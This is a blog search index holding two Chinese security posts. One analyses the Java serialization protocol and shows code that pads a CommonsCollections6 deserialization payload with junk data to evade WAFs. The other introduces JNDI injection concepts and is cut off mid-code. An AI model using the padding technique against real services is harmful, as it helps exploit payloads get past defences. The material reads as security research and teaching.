<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java反序列化协议构造与分析</title>
    <link href="/Decemberus.github-io/2023/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/Decemberus.github-io/2023/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p><h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>magic version contents<br>contents:<br>content<br>contents content<br>content:<br>object<br>blockdata<br>object:<br>newObject<br>newClass<br>newArray<br>newString<br>newEnum<br>newClassDesc<br>prevObject<br>nullReference<br>exception<br>TC_RESET<br></code></pre></td></tr></table></figure><p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p><p>它是有三部分组成：magic、version和contents。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p><p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure><p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p><p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure><p>content又是由object和blockdata组成</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure><p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p><p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p><p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure><p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p><p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p><p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p><p><strong>TC_的含义</strong></p><blockquote><p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p><p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p><ul><li>TC_OBJECT（对象）</li><li>TC_CLASSDESC（类描述符）</li><li>TC_ARRAY（数组）</li><li>TC_STRING（字符串）</li><li>TC_LONGSTRING（长字符串）</li><li>TC_NULL（null值）</li><li>TC_REFERENCE（引用）</li><li>TC_EXCEPTION（异常）</li><li>TC_BLOCKDATA（数据块）</li><li>TC_ENDBLOCKDATA（数据块结束）</li></ul><p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p></blockquote><h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure><p>将得到的Base64的数据流用zkar进行分析</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png" alt="image-20230223224253392"> </p><p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p><p>这个 classDesc 的ID就是8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p><p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p><h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p><p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>.....<br>yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p><ol><li><p>ArrayList</p></li><li><p>LinkedList</p></li><li><p>HashMap</p></li></ol><p>…..</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258276.png" alt="image-20230223230550344"> </p><p>所以我们可以改造ysoserial</p><p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p><p>完整的项目看这个</p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p><p>但是还有其他的操作</p><p>content是由object和blockdata组成，而blockdata是一个适合用来填充藏</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>object<br>blockdata<br><br>blockdata:<br>blockdatashort<br>blockdatalong<br><br>blockdatashort:<br><span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure><p>我们选择<code>blockdatalong</code></p><p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;cc6.ser&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入分析</title>
    <link href="/Decemberus.github-io/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/Decemberus.github-io/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。<br><code>JNDI</code>是<code>Java EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><h3 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h3><p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：<code>DNS</code>系统将计算机名和<code>IP</code>地址进行关联、文件系统将文件名和文件句柄进行关联等等。<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。<br>其中另一个值得一提的名称服务为 <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name</code>&#x2F;<code>value</code> 对，以等号分隔。比如一个 <code>LDAP</code> 名称如下:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure><p>即表示在 <code>c=US</code> 的子域中查找 <code>o=Sun</code> 的子域，再在结果中查找 <code>cn=John</code> 的对象。关于 <code>LDAP</code> 的详细介绍见后文。</p><p>在名称系统中，有几个重要的概念。<br><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。<br><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。<br><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p><h3 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。<br>一些典型的目录服务有:<br><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；<br><code>Active Directory</code>: 为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；<br>其他基于 <code>LDAP</code> 协议实现的目录服务；<br>总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。<br>在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。在 <code>Java</code> 应用中除了以常规方式使用名称服务(比如使用 <code>DNS</code> 解析域名)，另一个常见的用法是使用目录服务作为对象存储的系统，即用目录服务来存储和获取 <code>Java</code> 对象。<br>比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 <code>Java</code> 对象进行实际的打印操作。<br>为此，就有了 <code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。<br><code>JNDI</code> 架构上主要包含两个部分，即 <code>Java</code> 的应用层接口和 <code>SPI</code>，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png" alt="JNDI架构图.png"> </p><p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 <code>JDK</code> 中包含了下述内置的目录服务:<br><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；<br><code>LDAP</code>: 轻量级目录访问协议；<br><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；<br>除此之外，用户还可以在 <code>Java</code> 官网下载其他目录服务实现。由于 <code>SPI</code> 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。<br>为了更好理解 <code>JNDI</code>，我们需要了解其背后的服务提供者(<code>Service Provider</code>)，这些目录服务本身和 <code>JNDI</code> 有没直接耦合性，但基于 <code>SPI</code> 接口和 <code>JNDI</code> 构建起了重要的联系。</p><h2 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。<br>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<br></code></pre></td></tr></table></figure><h3 id="类介绍"><a href="#类介绍" class="headerlink" title="类介绍"></a>类介绍</h3><h4 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h4><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext();<br><span class="hljs-comment">//构建一个初始上下文</span><br>InitialContext();<br><span class="hljs-comment">//构建上下文并选择不初始化它</span><br>InitialContext(Hashtable&lt;?,?&gt; environment)<br><span class="hljs-comment">//使用提供的环境构建初始上下文</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将名称绑定到对象。 </span><br>bind(Name name, Object obj) <br><span class="hljs-comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br>list(String name) <br><span class="hljs-comment">//检索命名对象。</span><br>lookup(String name)  <br><span class="hljs-comment">//将名称绑定到对象，覆盖任何现有绑定。</span><br>rebind(String name, Object obj) <br><span class="hljs-comment">//取消绑定命名对象。</span><br>unbind(String name)  <br></code></pre></td></tr></table></figure><p>实例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ini</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        ini.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中lookup会去uri中查找对应对象并返回引用</p><h4 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h4><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了<code>JNDI</code>中类的引用功能。</p><p>构造方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为类名为“className”的对象构造一个新的引用。</span><br>Reference(String className) <br><span class="hljs-comment">//为类名为“className”的对象和地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr) <br><span class="hljs-comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr, String factory, String factoryLocation) <br><span class="hljs-comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br>Reference(String className, String factory, String factoryLocation)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数：</span><br><span class="hljs-comment">className 远程加载时所使用的类名(引用名称)</span><br><span class="hljs-comment">factory  加载的class中需要实例化类的名称（引用类型）</span><br><span class="hljs-comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将地址添加到索引posn的地址列表中。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> <br><span class="hljs-comment">//将地址添加到地址列表的末尾。 </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> <br><span class="hljs-comment">//从此引用中删除所有地址。  </span><br><span class="hljs-keyword">void</span> <span class="hljs-title 